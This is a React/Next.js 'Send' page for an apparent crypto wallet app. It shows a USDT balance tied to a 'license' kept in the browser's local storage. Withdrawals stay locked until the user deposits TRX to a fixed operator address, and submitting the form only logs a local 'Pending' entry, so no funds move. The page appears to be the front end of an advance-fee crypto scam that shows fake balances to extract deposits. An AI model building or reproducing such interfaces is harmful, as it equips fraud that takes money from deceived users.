"use client";

import { useState, useEffect } from "react";
import { Send, AlertCircle, CheckCircle, Copy, Check, Zap } from "lucide-react";
import {
  loadUserLicenses, getTrxBalance, addTransaction,
  TRX_REQUIRED, TRX_ADDRESS, formatUSDT,
} from "@/lib/license";
import { useT } from "@/lib/i18n";

interface Wallet { id: string; label: string; }

function buildWallets(usdtBalance: number): Wallet[] {
  const fmt = (n: number) => formatUSDT(n);
  return [
    { id: "usdt-trc20", label: `USDT TRC20 — ${fmt(usdtBalance)} USDT` },
    { id: "trx",        label: "TRX — 0.00 TRX" },
    { id: "btc",        label: "BTC — 0.00 BTC" },
    { id: "eth",        label: "ETH — 0.00 ETH" },
    { id: "bnb",        label: "BNB Smartchain — 0.00 BNB" },
    { id: "ltc",        label: "LTC — 0.00 LTC" },
    { id: "xrp",        label: "XRP — 0.00 XRP" },
  ];
}

function todayStr(): string {
  const d = new Date();
  const p = (n: number) => String(n).padStart(2, "0");
  return `${p(d.getDate())}.${p(d.getMonth() + 1)}.${d.getFullYear()}`;
}

export default function SendPage() {
  const [email, setEmail]     = useState("");
  const [trxBalance, setTrx]  = useState(0);
  const [wallets, setWallets] = useState<Wallet[]>(buildWallets(0));
  const [wallet, setWallet]   = useState("");
  const [address, setAddress] = useState("");
  const [amount, setAmount]   = useState("");
  const [sent, setSent]       = useState(false);
  const [copied, setCopied]   = useState(false);
  const [mounted, setMounted] = useState(false);
  const { t } = useT();
  const s = t.send;

  useEffect(() => {
    const em = localStorage.getItem("cv_user_email") ?? "";
    setEmail(em);
    const { current } = loadUserLicenses(em);
    setWallets(buildWallets(current?.usdtBalance ?? 0));
    setTrx(getTrxBalance(em));
    setMounted(true);
  }, []);

  const canSend = wallet && address.length > 10 && parseFloat(amount) > 0;
  const trxOk   = trxBalance >= TRX_REQUIRED;

  const handleSend = (e: React.FormEvent) => {
    e.preventDefault();
    if (!canSend || !trxOk) return;
    addTransaction(email, {
      type:    "Withdraw",
      status:  "Pending",
      address: address,
      amount:  `-${parseFloat(amount).toFixed(7)}`,
      date:    todayStr(),
    });
    setSent(true);
    setTimeout(() => setSent(false), 3000);
    setAddress(""); setAmount(""); setWallet("");
  };

  const copyAddr = () => {
    navigator.clipboard.writeText(TRX_ADDRESS).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 1500);
    });
  };

  if (!mounted) return <div className="flex flex-col h-full overflow-y-auto" />;

  return (
    <div className="flex flex-col h-full overflow-y-auto">
      <header className="bg-[#080810] border-b border-[#1a1a2e] px-6 py-3.5 sticky top-0 z-10">
        <h1 className="text-lg font-bold text-white">{s.title}</h1>
      </header>

      <main className="flex-1 flex items-start justify-center p-8">
        <div className="w-full max-w-lg">

          {!trxOk && (
            <div className="bg-[#111120] border border-amber-500/30 rounded-2xl p-7 mb-5">
              <div className="flex items-center gap-3 mb-4">
                <div className="w-10 h-10 rounded-xl bg-amber-500/15 flex items-center justify-center flex-shrink-0">
                  <Zap className="w-5 h-5 text-amber-400" />
                </div>
                <div>
                  <h2 className="text-base font-bold text-white">{s.trxGateTitle}</h2>
                  <p className="text-xs text-slate-500">{s.trxGateSubtitle}</p>
                </div>
              </div>

              <div className="bg-amber-500/5 border border-amber-500/20 rounded-xl p-4 mb-5">
                <p className="text-sm text-slate-300 leading-relaxed">
                  {s.trxGateBody(TRX_REQUIRED)}
                </p>
              </div>

              <p className="text-xs font-semibold text-slate-400 uppercase tracking-widest mb-2">
                {s.trxGateAddressLabel}
              </p>
              <div className="flex items-center gap-2 bg-[#0d0d1c] border border-[#1e1e30] rounded-xl px-4 py-3 mb-4">
                <code className="flex-1 text-xs text-amber-300 break-all font-mono">{TRX_ADDRESS}</code>
                <button onClick={copyAddr} className="flex-shrink-0 p-1.5 rounded-lg hover:bg-white/10 text-slate-400 hover:text-white transition-all">
                  {copied ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4" />}
                </button>
              </div>

              <div className="flex items-center gap-2 p-3 bg-[#0d0d1c] border border-[#1e1e30] rounded-xl text-xs text-slate-500">
                <AlertCircle className="w-3.5 h-3.5 text-amber-500 flex-shrink-0" />
                {s.trxNotePrefix}{" "}
                <a href="/software/receive" className="text-amber-400 mx-1 hover:underline">{s.trxNoteLink}</a>
                {s.trxNoteSuffix}
              </div>
            </div>
          )}

          <div className={`bg-[#111120] border border-[#1e1e30] rounded-2xl p-8 ${!trxOk ? "opacity-40 pointer-events-none select-none" : ""}`}>
            <div className="flex items-center gap-3 mb-2">
              <div className="w-9 h-9 rounded-xl bg-amber-500/15 flex items-center justify-center">
                <Send className="w-5 h-5 text-amber-400" />
              </div>
              <div>
                <h2 className="text-lg font-bold text-white">{s.formTitle}</h2>
                <p className="text-xs text-slate-500">{s.formSubtitle}</p>
              </div>
            </div>

            {sent && (
              <div className="mt-4 flex items-center gap-2 p-3 bg-emerald-500/10 border border-emerald-500/20 rounded-xl text-emerald-400 text-sm">
                <CheckCircle className="w-4 h-4 flex-shrink-0" />
                {s.success}
              </div>
            )}

            <form onSubmit={handleSend} className="mt-6 space-y-5">
              <div>
                <label className="block text-sm font-medium text-slate-300 mb-2">{s.fromWallet}</label>
                <select
                  value={wallet}
                  onChange={(e) => setWallet(e.target.value)}
                  className="w-full px-4 py-3 bg-[#0d0d1c] border border-[#1e1e30] rounded-xl text-white text-sm focus:outline-none focus:border-amber-500/50 transition-colors"
                >
                  <option value="" className="text-slate-500">{s.selectWallet}</option>
                  {wallets.map((w) => (
                    <option key={w.id} value={w.id} className="bg-[#0d0d1c]">{w.label}</option>
                  ))}
                </select>
              </div>

              <div>
                <label className="block text-sm font-medium text-slate-300 mb-2">{s.recipient}</label>
                <input
                  type="text"
                  value={address}
                  onChange={(e) => setAddress(e.target.value)}
                  placeholder={s.recipientPlaceholder}
                  className="w-full px-4 py-3 bg-[#0d0d1c] border border-[#1e1e30] rounded-xl text-white text-sm placeholder-slate-600 focus:outline-none focus:border-amber-500/50 transition-colors font-mono"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-slate-300 mb-2">{s.amount}</label>
                <input
                  type="number"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  placeholder="0.00"
                  min="0"
                  step="any"
                  className="w-full px-4 py-3 bg-[#0d0d1c] border border-[#1e1e30] rounded-xl text-white text-sm placeholder-slate-600 focus:outline-none focus:border-amber-500/50 transition-colors font-mono"
                />
              </div>

              {!wallet && (
                <div className="flex items-center gap-2 text-slate-500 text-xs">
                  <AlertCircle className="w-3.5 h-3.5 flex-shrink-0" />
                  {s.selectWalletHint}
                </div>
              )}

              <button
                type="submit"
                disabled={!canSend}
                className="w-full flex items-center justify-center gap-2 py-3.5 bg-amber-500 hover:bg-amber-400 disabled:bg-[#1e1e30] disabled:text-slate-600 disabled:cursor-not-allowed text-white font-semibold rounded-xl transition-all"
              >
                <Send className="w-4 h-4" />
                {s.submit}
              </button>
            </form>
          </div>

        </div>
      </main>
    </div>
  );
}
